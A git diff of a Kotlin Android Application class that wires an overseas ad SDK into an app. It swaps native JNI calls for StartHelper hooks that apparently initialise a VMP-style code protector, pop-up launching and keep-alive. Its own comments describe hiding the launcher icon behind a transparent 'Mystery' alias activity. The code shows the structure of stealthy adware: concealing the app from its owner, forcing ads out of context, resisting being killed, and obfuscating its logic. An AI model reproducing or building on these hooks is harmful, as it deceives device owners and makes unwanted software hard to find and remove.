@@ -1,9 +1,10 @@
 package com.deploy
 
 import android.app.Application
+import android.content.Context
 import android.content.Intent
 import android.os.Bundle
-import com.keep.up.all.NativeJniUtils
+import android.util.Log
 import com.p.b.ad.runtime.AdLifecycleInstaller
 import com.p.b.base.APPContext
 import com.p.b.base.OverseaAppHost
@@ -19,8 +20,16 @@ class TheApplication : Application(), OverseaAppHost {
         var insApp: TheApplication? = null
     }
 
+    override fun attachBaseContext(base: Context?) {
+        super.attachBaseContext(base)
+
+        Log.e("test","initVmp")
+        StartHelper.initVmp()
+    }
+
     override fun onCreate() {
         super.onCreate()
+
         insApp = this
         // 原生 Application 需要主动触发海外公共初始化。
         OverseaAppInitializer.init(this, this)
@@ -28,6 +37,8 @@ class TheApplication : Application(), OverseaAppHost {
         AdLifecycleInstaller.install(this)
         // 保证白包有 context
         APPContext.setApplication(this)
+
+
     }
 
     override fun openLaunch(intent: Intent?) {
@@ -40,21 +51,24 @@ class TheApplication : Application(), OverseaAppHost {
 
     override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
         // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
-        NativeJniUtils.pageopen(intent)
+//        NativeJniUtils.pageopen(intent)
     }
 
 
     override fun initPopPower() {
         // 启动图标隐藏：禁用 SplashActivity 主入口，启用透明 MysteryAliasActivity
-        startActivity(Intent(this, MysteryActivity::class.java).apply {
-            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        })
+//        startActivity(Intent(this, MysteryActivity::class.java).apply {
+//            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+//        })
+
+        Log.e("test","initkeep")
+        StartHelper.init(this)
     }
 
 
     override fun initKeepPower(app: Application) {
         // attachBaseContext 阶段 insApp 尚未赋值，必须使用回调传入的 Application。
-        NativeJniUtils.virinit(app)
+//        NativeJniUtils.virinit(app)
     }
 
 }
